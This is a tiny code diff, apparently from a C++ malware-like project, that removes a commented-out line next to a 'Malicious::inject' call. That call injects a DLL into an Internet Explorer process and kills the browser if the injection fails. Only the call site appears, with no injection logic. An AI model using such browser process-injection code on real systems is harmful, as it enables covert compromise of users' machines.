@@ -110,7 +110,6 @@ namespace Inhibiter
         LOG << "Injecting IE";
 
 		if(!Malicious::inject(ie.getPid(), dll_path))
-        //if(!Malicious::inject(injected_process.getPid(), "dll.dll"))
         {
             LOG << "Injection failed, killing IE";
 			ie.kill();
